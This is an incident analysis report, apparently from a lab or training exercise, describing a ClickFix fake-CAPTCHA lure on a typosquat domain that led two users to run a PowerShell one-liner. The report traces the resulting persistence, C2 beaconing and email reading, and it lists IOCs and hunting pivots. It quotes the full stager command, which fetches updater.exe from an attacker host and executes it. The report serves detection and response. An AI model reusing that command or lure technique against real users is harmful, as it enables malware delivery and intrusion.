# Incident Analysis Report

## Executive Summary
Two corporate users — `anders` (`anders@kongsberg.com`) at host `anders-desktop` and `john` (`john@airbus.com`) at host `john-desktop` — fell for a fake "Fortinet / CAPTCHA / file‑share" social‑engineering page (a classic **ClickFix** lure) on `http://f1leshare.net`. Both users pasted an attacker‑supplied PowerShell one‑liner that downloaded and executed an implant called `updater.exe` from their `%TEMP%` directory. The implant established persistence (Run key + Startup folder, masquerading as `msteamsupdater.exe`), beaconed to two typosquatting C2s (`miccosoftupdate.com`, `windowsupdater.tk`), enumerated user folders via `cmd.exe`, and on `anders-desktop` exfiltrated the contents of an email file `polen.eml` from the desktop.

Incident window: **2026‑03‑29 17:46–17:55 UTC**.

---

## Indicators of Compromise (IOCs)

### Network / Domains / URLs
| IOC | Type | Role | Evidence |
|---|---|---|---|
| `f1leshare.net` → `10.3.124.26` | Domain / IP | Stage‑0 lure + payload host | `logs-network_traffic.dns` and `logs-network_traffic.http` show requests to `http://f1leshare.net/?file=kongsberggrupper-insider&share=nordnet.no`, `…/?file=norway-buys-80-jets&share=reddit.com`, `…/captcha?email=anders%40kongsberg.com&q=Fortinet/abh4whnesdgbw07f/Important+Download`, `…/captcha?email=john%40airbus.com…`, `…/static/fortinet_logo.png`, `…/static/captcha.png`, `…/download/updater` (88 981 bytes, served twice). |
| `http://f1leshare.net/download/updater` | URL | Malware delivery | `user_agent.original: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.22621.169` — fetched directly by the PowerShell stager. |
| `miccosoftupdate.com` → `10.3.97.182` | Domain / IP | C2 #1 | DNS request from `updater.exe` (`endpoint.events.network`), HTTP `POST http://MiccosoftUpdate.com/api/info` and `…/api/data`, User‑Agent `Mozilla/5.0`. Typosquat of `microsoftupdate.com`. |
| `windowsupdater.tk` → `10.3.215.83` | Domain / IP | C2 #2 | DNS request from `updater.exe`, HTTP `POST http://windowsupdater.tk/windows/checkforupdate` and `…/update/servicedata`. |
| `10.3.124.26`, `10.3.97.182`, `10.3.215.83` | IPv4 | Lure / C2 infrastructure | All three observed on TCP/80 from both victim hosts. |

### Host / File / Hash IOCs
| IOC | Type | Evidence |
|---|---|---|
| `updater.exe` SHA‑256 `254601603F918D20338739B1EB4CB15BD31525AA5BCC2520C0432BB055603D7D` (MD5 `0AF1B6721ED62E0AC9144CC5B456DC78`, IMPHASH `E065512B1F6AE044E32B671B922B8349`) | Malicious PE | Sysmon Event ID 1 on both hosts; identical hash dropped to each user’s `%TEMP%`. |
| `C:\Users\anders\AppData\Local\Temp\updater.exe` | Dropper path | `endpoint.events.file` creation by `powershell.exe`. |
| `C:\Users\john\AppData\Local\Temp\updater.exe` | Dropper path | Same as above on `john-desktop`. |
| `C:\Users\<user>\AppData\Local\Microsoft\updater.exe` | Persistence copy | Created/modified by `updater.exe` itself. |
| `C:\Users\anders\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\msteamsupdater.exe` | Startup‑folder persistence (masquerade as Teams Updater) | `endpoint.events.file` creation by `updater.exe`. |
| Registry `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MicrosoftUpdater` = `C:\Users\anders\AppData\Local\Microsoft\updater.exe` | Run‑key persistence | `endpoint.events.registry` modification by `updater.exe`. |

### Command‑line / Behavioural IOC
PowerShell stager (executed by both `anders` and `john`, identical text):
```
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -exec bypass -windowstyle hidden -command
"[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};
 IWR -Uri 'http://f1leshare.net/download/updater' -OutFile $env:TEMP\updater.exe -UseBasicParsing;
 & $env:TEMP\updater.exe"
```
Evidence: Sysmon EID 1 + `endpoint.events.process` + Elastic Security alert *“Suspicious Windows Powershell Arguments”* / *“Remote File Download via PowerShell”*.

### Affected assets / users
- `anders-desktop` (`10.3.10.21`), user `ANDERS-DESKTOP\anders`, email `anders@kongsberg.com`.
- `john-desktop` (`10.3.10.22`), user `JOHN-DESKTOP\john`, email `john@airbus.com`.

---

## Timeline of Attacker Activity (UTC, 2026‑03‑29)

| Time | Host | Event |
|---|---|---|
| 17:46:30 | anders-desktop | Edge browser resolves and loads `f1leshare.net/?file=kongsberggrupper-insider&share=nordnet.no` (themed lure referencing Kongsberg Gruppen / Nordnet). |
| 17:46:32 | anders-desktop | Loads `static/fortinet_logo.png` → page is disguised as a Fortinet portal. |
| 17:46:41 | anders-desktop | Fetches `/captcha?email=anders%40kongsberg.com&q=Fortinet/abh4whnesdgbw07f/Important+Download` → ClickFix CAPTCHA presented to user `anders`. |
| 17:46:55 | anders-desktop | User runs the pasted PowerShell stager (Sysmon EID 1, parent PID is orphaned/`-` consistent with `Win+R → Run`). |
| 17:47:07 | anders-desktop | `IWR` GET `http://f1leshare.net/download/updater` (88 981 bytes) using PowerShell user‑agent. |
| 17:47:11 | anders-desktop | `updater.exe` written to `%TEMP%`. |
| 17:47:15 | john-desktop | Fetches `/captcha?email=john%40airbus.com…` → same lure targeting Airbus identity. |
| 17:47:20 | anders-desktop | `updater.exe` launched by PowerShell. |
| 17:47:21 | anders-desktop | Persistence: copies itself to `…\AppData\Local\Microsoft\updater.exe`, sets `HKCU\…\Run\MicrosoftUpdater`, drops `Startup\msteamsupdater.exe` (masquerading as the Teams updater seen earlier on `john-desktop`). |
| 17:47:22 | anders-desktop | First C2 beacon: DNS for `miccosoftupdate.com` → POST `/api/info`, `/api/data`. |
| 17:47:45 | john-desktop | Same PowerShell stager runs. |
| 17:47:49 | anders-desktop | Second C2: DNS `windowsupdater.tk` → POST `/windows/checkforupdate`, `/update/servicedata`. |
| 17:48:22 → 17:51:53 | anders-desktop | `updater.exe` spawns `cmd.exe` to run `dir "C:\Users"`, `dir "…\Documents"`, `dir "…\Desktop"`, then `type "C:\Users\anders\Desktop\polen.eml"` — host/user enumeration and reading of an email file. |
| 17:49:12 | john-desktop | `updater.exe` launched (same SHA‑256). |
| Continuous to ~17:55 | both | Periodic POST beacons to both C2 endpoints (response sizes vary 181–257 bytes — task polling pattern). |

---

## What the Attacker Did and Likely Goal

1. **Initial access — “ClickFix” social engineering.** The attacker stood up a fake file‑share / Fortinet‑branded page on `f1leshare.net` (note the `1` in place of `l`, brand‑abuse typosquat). The page personalised the lure per target (`kongsberggrupper-insider` to a Kongsberg employee, `norway-buys-80-jets` to an Airbus employee — both topical Norwegian defence/aviation themes), then displayed a fake CAPTCHA. The CAPTCHA instructs the visitor to “verify” by opening Run and pasting a command — a now‑common technique that bypasses browser download warnings because the user *runs the command themselves*. Both `anders@kongsberg.com` and `john@airbus.com` complied.
2. **Execution / Defence evasion.** PowerShell was launched with `-exec bypass -windowstyle hidden`, with `ServerCertificateValidationCallback={$true}` to ignore TLS errors, and used `IWR … -UseBasicParsing` to fetch `updater.exe` over plain HTTP into `%TEMP%`, then executed it in‑line.
3. **Persistence (two redundant mechanisms).** `updater.exe` copied itself to `…\AppData\Local\Microsoft\updater.exe`, installed an HKCU `Run` key named `MicrosoftUpdater` (Microsoft impersonation), and dropped `msteamsupdater.exe` into the per‑user Startup folder — a deliberate masquerade against the legitimate `msteamsupdate.exe` that Sysmon recorded earlier from `MicrosoftTeams_25227.501.3887.7600` on `john-desktop`.
4. **Command‑and‑control.** Two parallel HTTP C2 channels to typosquat domains: `miccosoftupdate.com/api/{info,data}` and `windowsupdater.tk/windows/checkforupdate` + `/update/servicedata`. Beacons used a generic `Mozilla/5.0` UA, short response bodies (≈181–257 bytes), confirming task‑polling.
5. **Discovery and (light) collection.** On `anders-desktop`, the implant invoked `cmd.exe /c dir` against `C:\Users`, `…\Documents`, `…\Desktop`, then `cmd.exe /c type "C:\Users\anders\Desktop\polen.eml"` — reading a Polish/“Polen”‑themed email file likely staged on the user’s desktop. This was caught by the *“System Information Discovery via Windows Command Shell”* and *“Unusual Discovery Signal”* alerts (parent process consistently `updater.exe`).

The combination — phishing‑themed company‑specific lures, ClickFix delivery, generic `updater.exe` implant, dual HTTP beaconing to typosquat domains, masquerade as Teams/Microsoft updater — is consistent with a commodity loader/RAT being operated to obtain a foothold in two defence/aerospace‑sector identities, with at least one host (`anders-desktop`) already used for hands‑on‑keyboard reconnaissance and reading of mailbox contents.

---

## Recommended Containment / Hunting Pivots

- Block / sinkhole `f1leshare.net`, `miccosoftupdate.com`, `windowsupdater.tk`, and IPs `10.3.124.26`, `10.3.97.182`, `10.3.215.83`.
- Quarantine SHA‑256 `254601603F918D20338739B1EB4CB15BD31525AA5BCC2520C0432BB055603D7D` and remove `%LOCALAPPDATA%\Microsoft\updater.exe`, `%TEMP%\updater.exe`, and Startup `msteamsupdater.exe` on both hosts; delete HKCU Run value `MicrosoftUpdater`.
- Hunt across the estate for: PowerShell command lines containing `ServerCertificateValidationCallback`, `IWR -Uri 'http://`, `& $env:TEMP\`, parent PID = `-` (orphaned, indicates Run‑dialog launch), Run keys named `MicrosoftUpdater`, and any fetch of `http://*/captcha?email=*&q=Fortinet*`.
- Rotate credentials and review mailbox/SSO activity for `anders@kongsberg.com` and `john@airbus.com`; treat `polen.eml` as exfiltrated.